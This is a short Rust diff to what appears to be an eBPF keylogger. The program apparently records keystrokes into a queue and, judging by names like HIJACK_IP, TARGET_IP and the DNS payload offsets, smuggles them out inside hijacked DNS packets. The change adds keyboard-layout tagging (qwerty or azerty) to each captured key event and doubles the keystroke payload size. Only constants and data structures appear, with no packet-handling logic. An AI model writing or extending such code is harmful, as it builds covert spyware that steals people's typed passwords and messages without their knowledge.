@@ -13,6 +13,9 @@ pub static TARGET_IP: u32 = 0;
 #[no_mangle]
 pub static HIJACK_IP: u32 = 0;
 
+#[no_mangle]
+pub static KEYBOARD_LAYOUT: u8 = 0;
+
 pub const IP_OFFSET: usize = EthHdr::LEN;
 pub const IP_TOT_LEN_OFFSET: usize = IP_OFFSET + 2;
 pub const IP_CSUM_OFFSET: usize = IP_OFFSET + 10;
@@ -26,11 +29,18 @@ pub const DNS_QUERY_OFFSET: usize = UDP_OFFSET + 8;
 
 pub const BPF_ADJ_ROOM_NET: u32 = 0;
 
-pub const KEYS_PAYLOAD_LEN: usize = 4;
+pub const KEYS_EVENTS_LEN: usize = 4;
+pub const KEYS_PAYLOAD_LEN: usize = 2 * KEYS_EVENTS_LEN;
 pub const DNS_PAYLOAD_MAX_LEN: usize = 128;
 
+#[derive(Default, Copy, Clone)]
+#[repr(C)]
+pub struct KeyEvent {
+    pub layout: u8, // 0:qwerty 1: azerty
+    pub key: u8,
+}
 #[map]
-pub static DATA: Queue<u32> = Queue::with_max_entries(4096, 0);
+pub static DATA: Queue<KeyEvent> = Queue::with_max_entries(4096, 0);
 
 pub enum UpdateType {
     Src,
